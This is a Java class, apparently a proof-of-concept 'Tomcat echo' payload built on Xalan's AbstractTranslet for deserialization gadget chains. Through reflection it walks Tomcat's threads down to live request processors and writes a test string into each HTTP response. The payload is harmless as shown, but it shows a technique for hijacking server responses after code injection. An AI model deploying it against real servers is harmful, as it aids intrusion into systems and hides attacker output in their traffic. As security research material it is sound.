package com.example.servletdemo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.ArrayList;

/**
 * @author     ：Walker
 * @description：Tocmat8 Echo
 **/

public class Tomcat8EchoTestbyWK extends AbstractTranslet {
    public Tomcat8EchoTestbyWK(){
        try {
            Object obj = Thread.currentThread();
            Field field = obj.getClass().getSuperclass().getDeclaredField("group");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            obj = field.get(obj);
            Thread[] threads = (Thread[]) obj;
            System.out.println(threads.length);
            for (Thread thread : threads) {
                if (thread.getName().contains("http-nio-8081-ClientPoller-0")) {
//                    Field[] fields = thread.getClass().getDeclaredFields();
//                    for (Field f: fields){
//                        System.out.println("Field in "+thread.getName()+" "+f);
//                    }
                    try {
                        field = thread.getClass().getDeclaredField("target");
                        field.setAccessible(true);
                        obj = field.get(thread);
                        System.out.println(thread.getName()+" obj-target:"+obj.getClass());


                        field = obj.getClass().getDeclaredField("this$0");
                        field.setAccessible(true);

                        org.apache.tomcat.util.net.NioEndpoint nioEndpoint = (org.apache.tomcat.util.net.NioEndpoint) field.get(obj);
                        obj = nioEndpoint.getHandler();

                        field = obj.getClass().getDeclaredField("global");
                        field.setAccessible(true);
                        obj = field.get(obj);

                        field = obj.getClass().getDeclaredField("processors");
                        field.setAccessible(true);
                        obj = field.get(obj);

                        ArrayList processors = (ArrayList) obj;
                        for (Object o : processors) {
                            try {
                                System.out.println(thread.getName() + "Test by WK");
                                field = o.getClass().getDeclaredField("req");
                                field.setAccessible(true);
                                obj = field.get(o);
                                org.apache.coyote.Request request = (org.apache.coyote.Request) obj;

                                byte[] buf = "Test by WK".getBytes();
                                ByteBuffer byteBuffer = ByteBuffer.wrap(buf);
                                request.getResponse().doWrite(byteBuffer);
                                request.getResponse().getBytesWritten(true);
                            }catch (Exception e){
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        System.out.println("thread Exception:"+thread.getName());
                    }
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }




    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

